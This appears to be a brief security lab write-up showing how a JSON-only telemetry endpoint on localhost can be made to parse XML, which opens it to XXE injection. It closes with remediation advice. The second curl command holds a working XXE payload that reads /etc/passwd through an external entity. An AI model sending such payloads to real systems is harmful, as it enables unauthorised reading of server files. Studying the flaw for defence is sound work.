Content-Type Confusion → XML XXE

CWE-436 + CWE-611 · JSON endpoint silently processes XML · XXE enabled on XML branch

This endpoint is documented as JSON-only. But the server dispatches on the actual Content-Type header — not a fixed expectation — and the XML branch uses lxml with resolve_entities=True. Switching the Content-Type opens XXE on a route that appears safe in code review.
Step 1 — Normal JSON request: 
curl -X POST http://localhost:5000/telemetry/data-feed \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<your-cookie>" \
  -d '{"sensor_id":"T-01","value":42}'
Step 2 — Switch to XML + inject XXE: 
curl -X POST http://localhost:5000/telemetry/data-feed \
  -H "Content-Type: application/xml" \
  -H "Cookie: session=<your-cookie>" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<telemetry>
  <sensor_id>T-01</sensor_id>
  <value>&xxe;</value>
</telemetry>'
The <value> field in the response will contain /etc/passwd.
Remediation: Accept only application/json; reject all other Content-Types at the route level. If XML must be supported, use defusedxml or lxml with resolve_entities=False.
